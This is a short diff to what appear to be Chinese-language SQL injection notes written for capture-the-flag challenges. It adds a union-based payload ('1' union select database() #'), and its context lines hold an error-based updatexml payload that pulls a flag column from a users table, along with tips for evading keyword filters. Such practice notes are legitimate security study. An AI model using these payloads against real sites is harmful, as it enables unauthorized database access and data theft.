@@ -121,6 +121,10 @@ and or 被过滤，使用||，&&，^等
 #这里right()函数如果被过滤了，所以用reverse()
 123"||(updatexml(1,concat('~',((select(right(real_flag_1s_here,30))from(users)where(real_flag_1s_here)regexp('^f')))),1))#
 ```
+部分题使用联合注入回显
+```
+1' union select database() #
+```
 
 ^
 ## **update的注入**
